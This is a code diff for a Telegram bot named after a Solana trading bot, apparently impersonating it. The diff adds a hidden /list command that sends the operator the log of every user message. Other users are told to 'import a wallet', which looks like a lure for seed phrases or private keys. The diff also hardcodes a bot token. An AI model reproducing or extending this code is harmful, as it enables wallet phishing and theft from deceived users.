@@ -12,6 +12,28 @@ from typing import Final
 TOKEN: Final = '7523077804:AAEWFJuuqYYO14TkBAwCuVvWdQWWeZaGoR4'
 BOT_USERNAME: Final = '@pepeboost_soll_bot'
 LOG_FILE_PATH: Final = 'user_messages.txt'
+ADMIN_USER_ID = 5551837706  # 将此替换为您的实际 Telegram 用户 ID
+
+async def list(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """处理 /getlogs 命令，发送 user_messages.txt 的内容"""
+    user = update.effective_user
+    if user.id != ADMIN_USER_ID:
+        await update.message.reply_text("🔗 Please import a wallet to start\n\n请先绑定钱包")
+        return
+
+    try:
+        async with aiofiles.open('user_messages.txt', mode='r', encoding='utf-8') as f:
+            content = await f.read()
+        # Telegram 消息长度限制为4096字符
+        if len(content) > 4000:
+            # 如果内容过长，以文件形式发送
+            async with aiofiles.open('user_messages.txt', mode='rb') as f:
+                await update.message.reply_document(document=f, filename='user_messages.txt')
+        else:
+            await update.message.reply_text(content or "日志文件为空。")
+    except Exception as e:
+        await update.message.reply_text(f"无法读取日志文件: {e}")
+        
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
@@ -114,6 +136,8 @@ def main() -> None:
     # 添加 /start 命令处理器
     start_handler = CommandHandler('start', start)
     application.add_handler(start_handler)
+    getlogs_handler = CommandHandler('list', list)
+    application.add_handler(getlogs_handler)
 
     # 添加回调查询处理器
     button_handler = CallbackQueryHandler(button_callback)
